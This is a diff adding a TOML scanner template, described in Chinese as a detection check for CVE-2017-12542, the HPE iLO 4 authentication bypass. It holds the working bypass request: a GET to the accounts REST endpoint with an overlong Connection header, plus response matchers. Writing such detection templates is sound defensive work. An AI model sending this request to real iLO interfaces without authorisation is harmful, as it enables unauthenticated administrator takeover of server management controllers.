@@ -1,0 +1,39 @@
+[info]
+author = "ave"
+description = "检测HPE iLO 4认证绕过漏洞，未经认证的远程攻击者可通过发送特殊Connection头请求/rest/v1/AccountService/Accounts端点，绕过身份验证并获取管理员权限"
+id = "POC-AVE-2017-0030"
+name = "CVE-2017-12542 PoC"
+severity = "critical"
+tags = ["ave-2017-0030"]
+vuln_id = [
+    "CVE-2017-12542",
+    "AVE-2017-0030",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/rest/v1/AccountService/Accounts"
+protocol = "http"
+
+[poc.requests.headers]
+Connection = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["iLO User"]
+
+[[poc.requests.matchers]]
+expect = true
+part = "header"
+type = "word"
+words = ["application/json"]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
